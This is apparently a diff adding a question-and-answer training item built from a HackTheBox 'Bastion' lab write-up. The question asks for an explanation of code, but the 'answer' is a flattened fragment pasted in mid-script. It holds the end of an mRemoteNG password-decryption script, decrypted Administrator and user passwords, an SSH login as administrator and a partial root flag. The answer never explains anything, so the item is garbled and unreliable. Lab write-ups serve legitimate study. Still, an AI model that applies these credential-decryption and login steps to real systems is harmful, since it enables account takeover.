@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Explain the purpose and usage of the code/command in the following text: (Context: Writeup from Htb Bastion Hacks Stuff)
+
+CONTEXT:
+Source: Htb Bastion Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+update ( salt ) 42 password = aes . decrypt_and_verify ( cipher , tag ). decode () 43 print ( f " Username: { user } \n Password: { password } \n " ) It takes a consCons.xml file, and prints all the decrpyted passwords it can find. root@kali# ./mRemoteNG-decrypt.py confCons.xml-orig [+] Found nodes: 2 Username: Administrator Password: thXLHM96BeKL0ER2 Username: L4mpje Password: bureaulampje This script is also available on my Gitlab . SSH as administrator With that password, I can ssh in as administrator: root@kali# ssh administrator@10.10.10.134 administrator@10.10.10.134's password: Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. administrator@BASTION C:\Users\Administrator> And I can grab root.txt : administrator@BASTION C:\Users\Administrator\Desktop> type root.txt 958850b9...
